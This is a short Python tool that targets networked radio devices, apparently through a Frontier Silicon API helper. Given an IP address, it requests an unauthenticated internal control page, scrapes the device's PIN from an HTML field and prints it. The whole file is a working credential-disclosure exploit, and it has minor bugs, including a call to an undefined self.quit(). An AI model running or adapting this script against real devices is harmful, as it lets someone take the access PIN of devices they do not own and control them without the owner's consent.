import requests
import sys
import fsapi as api

from bs4 import BeautifulSoup
from requests.models import Response

class PinResolver(object):

    def __init__(self) -> None:
        super().__init__()
        self.pin = ""
        self.URL = ""

    def get_pin(self) -> str:
        return self.pin
    
    def parse_html(self, page: Response) -> BeautifulSoup:
        api.debug("[*] Parsing...")
        s_soup = None
        try:
            s_soup = BeautifulSoup(page.content, "html.parser")   
        except:
            print("[!] Error while parsing the website")
            api.quit()
        api.debug("[*] Parsing complete.")
        return s_soup

    def exctract(self, pin: str) -> str:
        pin_t = str(pin)
        pin_t = pin_t[pin_t.index('>') + 1:]
        pin_t = pin_t[:pin_t.index('<')]
        return pin_t.strip()

    def result(self, pin: str, url: str) -> None:
        print("\n[#] Found PIN")
        print("[#] WEB: " + url)
        print("[#] PIN: " + pin + "\n")

    def __resolve__(self): 
        '''
        @param: The -i flag indicates the ip-Address to connect to
        @param: The -d flag indicates if the debug should be enabled
        '''
        if sys.argv[1] == "-i":
    
            ip = str(sys.argv[2])

            if len(sys.argv) > 3:
                if sys.argv[3] == "-d":
                    api.debug = lambda str: print(str)

            try:
                api.check_ip(ip)
            except:
                print("[!] Unexpected error at -i -> '", ip, "'")
                api.quit()

            self.URL = "http://" + ip + "/web/iperf/control.html"  

            page = api.fetch_url(self.URL)
            soup = self.parse_html(page)

            try:
                pins = soup.find(id="radiopintextarea")

                pin_t = self.exctract(pins)
                self.result(pin=pin_t, url=self.URL)
            except:
                print("[!] Error while trying to get the PIN")
            
            self.quit()
        else:
            print("[!] Unexpected input: '" + sys.argv[1] + "'")

p_R = PinResolver()
p_R.__resolve__()
